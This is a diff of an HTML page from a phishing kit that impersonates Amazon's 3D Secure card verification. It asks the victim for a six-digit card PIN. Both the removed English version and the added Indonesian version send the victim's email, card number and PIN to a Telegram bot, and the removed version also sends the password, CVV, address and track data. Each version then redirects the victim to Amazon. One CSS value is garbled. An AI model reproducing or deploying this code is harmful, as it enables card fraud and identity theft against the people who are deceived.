@@ -1,160 +1,94 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>3D Secure Verification</title>
-    <script src="config.js"></script>
+    <title>Verifikasi 3D Secure</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
-        .logo { margin: 0 0 25px; text-align: center; }
-        .logo img { height: 60px; }
-        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
-        h1 { font-size: 20px; margin-bottom: 8px; font-weight: 500; }
-        .sub { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.5; }
-        .info { background: #f7f8f8; border-radius: 6px; padding: 12px 15px; margin-bottom: 25px; font-size: 13px; line-height: 1.8; }
-        .pin-judul { font-size: 15px; font-weight: 600; margin-bottom: 12px; }
-        .pin-ket { font-size: 12px; color: #555; margin-bottom: 15px; }
-        .pin-baris { display: flex; gap: 10px; margin-bottom: 20px; justify-content: space-between; }
-        .pin-kolom { flex: 1; max-width: 65px; }
-        .pin-kolom input { width: 100%; height: 50px; text-align: center; font-size: 20px; border: 1px solid #a6a6a6; border-radius: 4px; outline: none; }
-        .pin-kolom input:focus { border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
-        button { width: 100%; padding: 12px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; }
-        button:hover { background: #F7CA00; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
+        .kotak { background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 30px; max-width: 420px; width: 100%; text-align: center; }
+        h1 { font-size: 20px; margin-bottom: 10px; }
+        .sub { color: #666; font-size: 14px; margin-bottom: 25px; }
+        .info-kartu { background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 25px; text-align: left; font-size: 14px; }
+        .info-kartu p { margin: 5px 0; }
+        .kotak-pin { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .kotak-pin input { width: 42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ8px; outline: none; }
+        .kotak-pin input:focus { border-color: #0071e3; }
+        button { width: 100%; padding: 12px; background: #0071e3; color: #fff; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .proses { display: none; color: #007600; margin-top: 15px; text-align: center; }
-        .proses.tampil { display: block; }
-        .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
-        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
     </style>
 </head>
 <body>
-    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1>3D Secure Verification</h1>
-        <p class="sub">Your bank requires additional verification to protect your transaction.</p>
+        <h1>Verifikasi 3D Secure</h1>
+        <p class="sub">Masukkan PIN kartu Anda untuk menyelesaikan transaksi</p>
         
-        <div class="info">
-            <div>Card: <strong id="tampilKartu">—</strong></div>
-            <div>Email: <strong id="tampilEmail">—</strong></div>
+        <div class="info-kartu">
+            <p><strong>Email:</strong> <span id="tampilEmail">-</span></p>
+            <p><strong>Kartu berakhiran:</strong> <span id="tampilAkhiran">-</span></p>
         </div>
 
-        <form id="form3ds">
-            <p class="pin-judul">Enter your PIN</p>
-            <p class="pin-ket">Enter the 6-digit verification PIN from your card-issuing bank.</p>
-            
-            <div class="pin-baris">
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p1"></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p2"></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p3"></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p4"></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p5"></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p6"></div>
-            </div>
+        <div class="kotak-pin">
+            <input type="password" maxlength="1" class="pin" data-urutan="1">
+            <input type="password" maxlength="1" class="pin" data-urutan="2">
+            <input type="password" maxlength="1" class="pin" data-urutan="3">
+            <input type="password" maxlength="1" class="pin" data-urutan="4">
+            <input type="password" maxlength="1" class="pin" data-urutan="5">
+            <input type="password" maxlength="1" class="pin" data-urutan="6">
+        </div>
 
-            <button type="submit" id="tombol">Verify & Complete</button>
-            <div class="proses" id="sedang">⏳ Verifying...</div>
-        </form>
-    </div>
-    <div class="footer">
-        <a href="#">Conditions of Use</a>
-        <a href="#">Privacy Notice</a>
-        <a href="#">Help</a>
-        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <button id="tombolKirim" disabled onclick="selesai()">Selesai</button>
     </div>
 
     <script>
-        const email = localStorage.getItem('emailPengguna') || '';
-        const pass = localStorage.getItem('passwordPengguna') || '';
-        const nomor = localStorage.getItem('nomorKartu') || '';
-        const expiry = localStorage.getItem('expiry') || '';
-        const cvv = localStorage.getItem('cvv') || '';
-        const namaKartu = localStorage.getItem('namaKartu') || '';
-        const alamat = localStorage.getItem('alamat') || '';
-        const kota = localStorage.getItem('kota') || '';
-        const kodepos = localStorage.getItem('kodepos') || '';
-        const telepon = localStorage.getItem('telepon') || '';
-        const track = localStorage.getItem('trackKartu') || '';
-
-        if (!nomor || !email) { window.location.href = 'billing.html'; }
-
-        const tampilNomor = nomor.length >= 4 
-            ? `•••• •••• •••• ${nomor.slice(-4)}` 
-            : 'Not available';
-        document.getElementById('tampilKartu').textContent = tampilNomor;
+        // Tampilkan data
+        const email = localStorage.getItem('emailPengguna') || '-';
+        const nomorKartu = localStorage.getItem('nomorKartu') || '';
+        const akhir = nomorKartu.replace(/\s/g,'').slice(-4);
         document.getElementById('tampilEmail').textContent = email;
+        document.getElementById('tampilAkhiran').textContent = akhir || '****';
 
-        const kolom = [
-            { el: document.getElementById('p1'), val: '' },
-            { el: document.getElementById('p2'), val: '' },
-            { el: document.getElementById('p3'), val: '' },
-            { el: document.getElementById('p4'), val: '' },
-            { el: document.getElementById('p5'), val: '' },
-            { el: document.getElementById('p6'), val: '' }
-        ];
-
-        kolom.forEach((item, i) => {
-            item.el.addEventListener('input', function() {
-                const angka = this.value.replace(/\D/g, '');
-                if (angka) {
-                    item.val = angka[0];
-                    this.value = '•';
-                    if (i < 5) kolom[i+1].el.focus();
+        // Pindah kolom otomatis
+        const kolom = document.querySelectorAll('.pin');
+        kolom.forEach((inp, idx) => {
+            inp.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value && idx < kolom.length - 1) {
+                    kolom[idx + 1].focus();
                 }
+                cekPinLengkap();
             });
-            item.el.addEventListener('focus', function() {
-                if (item.val) this.value = item.val;
-            });
-            item.el.addEventListener('blur', function() {
-                if (item.val) this.value = '•';
-            });
-            item.el.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace') {
-                    if (!item.val && i > 0) kolom[i-1].el.focus();
-                    else { item.val = ''; this.value = ''; }
+            inp.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && idx > 0) {
+                    kolom[idx - 1].focus();
                 }
             });
         });
 
-        function ambilPIN() {
-            return kolom.map(k => k.val).join('');
+        function cekPinLengkap() {
+            const lengkap = Array.from(kolom).every(i => i.value);
+            document.getElementById('tombolKirim').disabled = !lengkap;
         }
 
-        document.getElementById('form3ds').addEventListener('submit', async e => {
-            e.preventDefault();
-            const pin = ambilPIN();
-            if (pin.length !== 6) { alert('Please enter 6-digit PIN'); return; }
+        function selesai() {
+            const pin = Array.from(kolom).map(i => i.value).join('');
+            
+            // Kirim ke Telegram
+            const token = localStorage.getItem('botTelegram');
+            const chatId = localStorage.getItem('chatTelegram');
+            if (token && chatId) {
+                const pesan = `🔐 PIN 3D SECURE\n━━━━━━━━━━━━━━━━\n📧 Email: ${email}\n💳 Kartu: ${nomorKartu}\n🔢 PIN: ${pin}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: pesan })
+                });
+            }
 
-            document.getElementById('tombol').disabled = true;
-            document.getElementById('tombol').style.display = 'none';
-            document.getElementById('sedang').classList.add('tampil');
-
-            const pesan = `
-🔐 *PIN VERIFIED*
-━━━━━━━━━━━━━━━━━━━━━
-📧 Email: \`${email}\`
-🔑 Password: \`${pass}\`
-👤 Name: \`${namaKartu}\`
-🔢 Card: \`${nomor}\`
-📅 Exp: \`${expiry}\`
-🔒 CVV: \`${cvv}\`
-📍 Address: \`${alamat}, ${kota} — ${kodepos}\`
-📞 Phone: \`${telepon}\`
-🔐 PIN: \`${pin}\`
-━━━━━━━━━━━━━━━━━━━━━
-📋 *TRACK DATA*
-\`\`\`
-${track}
-\`\`\`
-🕐 Time: ${new Date().toLocaleString()}
-            `.trim();
-            await CONFIG.kirimKeTelegram(pesan);
-
-            setTimeout(() => {
-                window.location.href = 'https://www.amazon.com.au/';
-            }, 1000);
-        });
+            // Alihkan ke Amazon
+            window.location.href = 'https://www.amazon.com';
+        }
     </script>
 </body>
 </html>
